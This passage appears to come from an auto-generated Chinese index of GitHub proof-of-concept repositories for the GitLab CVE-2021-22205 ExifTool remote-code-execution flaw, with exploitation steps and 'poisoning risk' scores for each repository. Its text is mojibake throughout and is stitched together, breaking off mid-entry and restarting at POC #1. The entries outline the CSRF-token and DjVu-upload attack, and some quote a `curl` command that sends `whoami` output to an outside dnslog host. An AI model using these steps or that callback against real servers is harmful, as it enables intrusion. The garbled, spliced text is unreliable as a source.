ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£Žé™©çº¦ä¸º 10%ã€‚ä¸»è¦åŽŸå› æ˜¯è¯¥è„šæœ¬çš„åŠŸèƒ½è¾ƒä¸ºé›†ä¸­ï¼Œä¸”ä¾èµ–æ¨¡å—è¾ƒå°‘ã€‚ä½†ä»ç„¶éœ€è¦å¯¹è„šæœ¬è¿›è¡Œä»”ç»†å®¡æŸ¥ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [cc3305/CVE-2021-22205](https://github.com/cc3305/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #8

**æ¥æº**: [CVE-2021-22205-ccordeiro_CVE-2021-22205.md](../2021/CVE-2021-22205-ccordeiro_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®ï¼Œä¸”æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 å­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ `/users/sign_in`ï¼ŒèŽ·å– CSRF tokenã€‚ 
2.  ç„¶åŽï¼Œæ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚è¯¥æ–‡ä»¶ä¸­çš„ metadata å­—æ®µåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ `curl whoami.82sm53.dnslog.cn` æˆ–å…¶ä»–æ¶æ„æŒ‡ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ­¤ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚è¯·æ±‚å¤´ä¸­åŒ…å«ä¹‹å‰èŽ·å–çš„ CSRF tokenã€‚
4.  GitLab åœ¨å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼ŒExifTool ä¼šæ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„PoCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ExifToolå…ƒæ•°æ®ï¼Œå¯ä»¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚PoCä»£ç é¦–å…ˆèŽ·å–CSRF Tokenï¼Œç„¶åŽæž„é€ åŒ…å«payloadçš„multipart/form-dataè¯·æ±‚ï¼Œå‘é€åˆ°`/uploads/user`ç«¯ç‚¹ã€‚å¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žä¸”æœªæ‰“è¡¥ä¸ï¼ŒPoCä¼šæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**
æä¾›çš„PoCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚ç»è¿‡åˆ†æžï¼Œä»£ç ä¸­æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æ¶æ„é€»è¾‘æˆ–åŽé—¨ã€‚ é£Žé™©è¾ƒä½Žï¼Œ ä½†æ˜¯å¹¶ä¸èƒ½æŽ’é™¤ä½œè€…åœ¨ä»£ç ä¸­éšè—äº†ä¸æ˜“å¯Ÿè§‰çš„æŠ•æ¯’ä»£ç ã€‚ä¾‹å¦‚é€šè¿‡ç½‘ç»œåŠ è½½æ¶æ„ä»£ç ç­‰ã€‚æ‰€ä»¥è¿™é‡Œè¯„ä¼°çš„æŠ•æ¯’é£Žé™©ä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #9

**æ¥æº**: [CVE-2021-22205-devdanqtuan_CVE-2021-22205.md](../2021/CVE-2021-22205-devdanqtuan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ GitLab å®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—® GitLab å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Tokenï¼Œè¯¥ Token å¯é€šè¿‡è®¿é—®ç™»å½•é¡µé¢èŽ·å¾—ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åˆ©ç”¨ ExifTool çš„æ¼æ´žï¼Œåœ¨è§£æžå…ƒæ•°æ®æ—¶æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab çš„å¤´åƒä¸Šä¼ æŽ¥å£ `/uploads/user`ã€‚
4.  GitLab è°ƒç”¨ ExifTool è§£æžå›¾åƒæ–‡ä»¶ï¼ŒExifTool æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**

æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒæ¨¡æ‹Ÿäº†ä¸Šè¿°åˆ©ç”¨æµç¨‹ï¼Œèƒ½å¤ŸæˆåŠŸè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ã€‚POC é€šè¿‡æž„é€ æ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ° ExifTool å¯ä»¥è§£æžçš„å…ƒæ•°æ®ä¸­ã€‚ä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡åˆ°å­˜åœ¨æ¼æ´žçš„GitLabæœåŠ¡å™¨ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

ä»£ç æ•´ä½“æ˜¯ç”¨äºŽå¤çŽ°æ¼æ´žï¼Œä½†å­˜åœ¨å¾®å°çš„æŠ•æ¯’é£Žé™©ã€‚ä¸»è¦é£Žé™©ç‚¹åœ¨äºŽæ”»å‡»å‘½ä»¤çš„æž„é€ ä»¥åŠæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹`target_url`æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è€ƒè™‘åˆ°POCæœ¬èº«å°±æ˜¯æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨åœºæ™¯ä¸‹æ˜¯æ²¡é—®é¢˜çš„ã€‚é™¤éžï¼Œæœ‰äººæ•…æ„é­”æ”¹æ­¤ä»£ç ï¼Œæˆ–è€…åœ¨æ‰¹é‡æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…æœªæ£€æŸ¥urlï¼Œå¯èƒ½ä¼šæœ‰ä¸€å®šé£Žé™©ã€‚æ•…è®¤ä¸ºæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œçº¦ä¸º1%ã€‚

**ä¼˜å…ˆçº§:**

ç”±äºŽæœç´¢å¼•æ“Žæ²¡æœ‰æä¾›ç»“æžœï¼Œå› æ­¤ä¼˜å…ˆçº§ä¸ºæ¼æ´žåˆ©ç”¨ä»£ç  > æ¼æ´žåº“ä¿¡æ¯ã€‚

**é¡¹ç›®åœ°å€:** [devdanqtuan/CVE-2021-22205](https://github.com/devdanqtuan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #10

**æ¥æº**: [CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md](../2021/CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md)

# CVE-2021-22205

> ðŸ“¦ è¯¥CVEæœ‰ **24** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2021-22205-Al1ex_CVE-2021-22205.md](../2021/CVE-2021-22205-Al1ex_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œä¸”ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab å¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ 11.9 åˆ° 13.8.8ï¼Œ13.9 åˆ° 13.9.6 ä»¥åŠ 13.10 åˆ° 13.10.3ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’ŒPOCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç é€šè¿‡æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åµŒå…¥äº†å‘½ä»¤ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾åƒæ—¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚POCä»£ç èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

å¯¹POCä»£ç çš„æŠ•æ¯’é£Žé™©åˆ†æžå¦‚ä¸‹ï¼š

*   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žï¼Œç»“æž„æ¸…æ™°ï¼Œç›®çš„æ˜¯æž„é€ æ¶æ„å›¾ç‰‡å¹¶å‘é€è¯·æ±‚ã€‚
*   è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£Žé™©ï¼Œä½†è¿™å±žäºŽæ¼æ´žæœ¬èº«çš„ç‰¹æ€§ï¼Œè€Œéžä½œè€…é¢å¤–æ·»åŠ çš„æ¶æ„ä»£ç ã€‚
*   å…¶ä¸­`curl `whoami`.82sm53.dnslog.cn`åªæ˜¯ä¸€ä¸ªDNSLogæ£€æµ‹ï¼Œç”¨äºŽéªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œå¹¶éžæ¶æ„æŠ•æ¯’ã€‚

è™½ç„¶æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´žæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä½†å°±æä¾›çš„POCä»£ç æœ¬èº«è€Œè¨€ï¼Œä¸å­˜åœ¨æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œå¤§çº¦ä¸º5%ã€‚ä¸»è¦é£Žé™©åœ¨äºŽä½¿ç”¨è¯¥POCè¿›è¡ŒæœªæŽˆæƒçš„æ¸—é€æµ‹è¯•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ï¼ˆ/users/sign_inï¼‰ï¼ŒèŽ·å–CSRF Tokenã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ExifToolå¤„ç†è¯¥å›¾åƒæ—¶æ‰§è¡Œã€‚`attack` å‡½æ•°ä¸­çš„ä»£ç å…è®¸é€šè¿‡ `-c` å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…é€šè¿‡/uploads/useræŽ¥å£ä¸Šä¼ æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚åŒæ—¶åœ¨POSTè¯·æ±‚ä¸­å¸¦ä¸ŠCSRF Tokenã€‚
4.  å½“GitLabå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šè§£æžè¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚
5.  æ”»å‡»è€…é€šè¿‡DNSLogæˆ–å…¶ä»–æ–¹å¼æ¥æŽ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„ç»“æžœï¼Œæˆ–è€…ç›´æŽ¥åˆ©ç”¨æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #2

**æ¥æº**: [CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md](../2021/CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨ä¸”å¯ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE 11.9 åˆ° 13.10.3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå½“ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLab Workhorse ä¼šå°† jpg|jpeg|tiff æ‰©å±•åçš„æ–‡ä»¶ä¼ é€’ç»™ ExifTool ä»¥åˆ é™¤ä»»ä½•éžç™½åå•çš„æ ‡ç­¾ã€‚ ExifTool å°†å¿½ç•¥æ–‡ä»¶æ‰©å±•åå¹¶å°è¯•æ ¹æ®å†…å®¹ç¡®å®šæ–‡ä»¶ç±»åž‹ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶æ¥è§¦å‘ DjVu è§£æžå™¨ã€‚ DjVu è§£æžå™¨åœ¨è§£æž DjVu æ³¨é‡Šæ—¶ï¼Œä¼šå¯¹ token è¿›è¡Œ eval æ“ä½œä»¥è½¬æ¢ C è½¬ä¹‰åºåˆ—ã€‚è™½ç„¶å­˜åœ¨ä¸€äº›éªŒè¯æ¥ç¡®ä¿æ‰€æœ‰å†…å®¹éƒ½è¢«æ­£ç¡®è½¬ä¹‰ï¼Œä½†æ˜¯åæ–œæ åŽè·Ÿæ¢è¡Œç¬¦å¯ä»¥è¢«æ­£ç¡®å¤„ç†ï¼Œä»Žè€Œå…è®¸å¼•å·è¢«å…³é—­ï¼Œå¹¶æ’å…¥å’Œè¯„ä¼°ä»»æ„ Perl ä»£ç ã€‚

æä¾›çš„ POC ä»£ç  (CVE-2021-22205.nse) æ˜¯ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå®ƒä¸ç›´æŽ¥åˆ©ç”¨è¯¥æ¼æ´žæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯é€šè¿‡æ£€æŸ¥ç‰¹å®š CSS æ–‡ä»¶çš„å­˜åœ¨æ¥åˆ¤æ–­ç›®æ ‡ GitLab å®žä¾‹æ˜¯å¦ä¸ºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ã€‚ å®ƒé€šè¿‡å‘é€ HTTP GET è¯·æ±‚åˆ° GitLab å®žä¾‹ï¼Œæ ¹æ®è¿”å›žçš„ CSS æ–‡ä»¶å†…å®¹æ¥ç¡®å®šGitLabçš„ç‰ˆæœ¬,å¦‚æžœç‰ˆæœ¬åœ¨å—å½±å“çš„èŒƒå›´å†…,åˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´žã€‚

åˆ©ç”¨æ–¹å¼ï¼š
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DjVu æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Perl ä»£ç ã€‚
2.  å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ï¼ˆé€šå¸¸ä½œä¸ºå¤´åƒã€é¡¹ç›®logoæˆ–å…¶ä»–å…è®¸ä¸Šä¼ å›¾åƒçš„å­—æ®µï¼‰ã€‚
3.  GitLab Workhorse å°†æ–‡ä»¶ä¼ é€’ç»™ ExifTool è¿›è¡Œå¤„ç†ã€‚
4.  ExifTool è¯†åˆ«å‡º DjVu æ ¼å¼å¹¶è°ƒç”¨ç›¸åº”çš„è§£æžå™¨ã€‚
5.  æ¶æ„ Perl ä»£ç è¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æŠ•æ¯’é£Žé™©è¯„ä¼°ï¼š
è¯¥ Nmap è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¯¥æ¼æ´žã€‚ ä»£ç ä¸­æ²¡æœ‰å‘çŽ°ä»»ä½•å°è¯•æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å‘ç›®æ ‡ç³»ç»Ÿæ¤å…¥åŽé—¨çš„è¿¹è±¡ã€‚ å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Ž (0%)ã€‚


**é¡¹ç›®åœ°å€:** [DIVD-NL/GitLab-cve-2021-22205-nse](https://github.com/DIVD-NL/GitLab-cve-2021-22205-nse)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #3

**æ¥æº**: [CVE-2021-22205-Hikikan_CVE-2021-22205.md](../2021/CVE-2021-22205-Hikikan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8ï¼›>=13.9, <13.9.6ï¼›>=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œå—å½±å“çš„GitLabå®žä¾‹æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æž„é€ çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨GitLabä½¿ç”¨çš„ExifToolå·¥å…·ä¸­çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§åˆ†æžï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ï¼Œè¯¥æ¼æ´žå½±å“GitLab 11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä¸”å±å®³ç­‰çº§ä¸ºCRITICALã€‚æä¾›çš„POCä»£ç `/tmp/2f45104b4dac4f2167b8fc87a9a77f9a/README.md` ä»…ä»…æ˜¯ä¸€ä¸ªè¯´æ˜Žæ–‡ä»¶ï¼Œæœ¬èº«ä¸å…·å¤‡æ¼æ´žåˆ©ç”¨èƒ½åŠ›ï¼Œåªæ˜¯è¯´æ˜Žäº†cveç¼–å·ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åˆ©ç”¨payloadï¼Œéœ€è¦é…åˆæœç´¢å¼•æ“ŽæŸ¥æ‰¾çœŸæ­£çš„åˆ©ç”¨ä»£ç ã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**
æä¾›çš„POCä»£ç æ–‡ä»¶å†…å®¹æžå…¶ç®€å•ï¼Œåªæœ‰CVEç¼–å·çš„æè¿°ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©æžä½Žã€‚å¯ä»¥è®¤ä¸ºæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†è¯¥å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šï¼Œä¾‹å¦‚é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLab ä½¿ç”¨ ExifTool è§£æžè¯¥å›¾åƒæ–‡ä»¶æ—¶ï¼Œæ¶æ„å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

æ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒæ–‡ä»¶ä¸­åµŒå…¥payloadï¼Œé€šå¸¸æ˜¯æž„é€ ä¸€ä¸ªç•¸å½¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ–‡ä»¶æ—¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚

**ä¼˜å…ˆçº§ï¼š**
æ ¹æ®æŽ’åºä¼˜å…ˆçº§ï¼Œæœç´¢å¼•æ“Žç»“æžœï¼ˆå½“å‰ä¸ºç©ºï¼‰> æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆç®€å•çš„READMEï¼‰> æ¼æ´žåº“ä¿¡æ¯ã€‚


**é¡¹ç›®åœ°å€:** [Hikikan/CVE-2021-22205](https://github.com/Hikikan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #4

**æ¥æº**: [CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md](../2021/CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

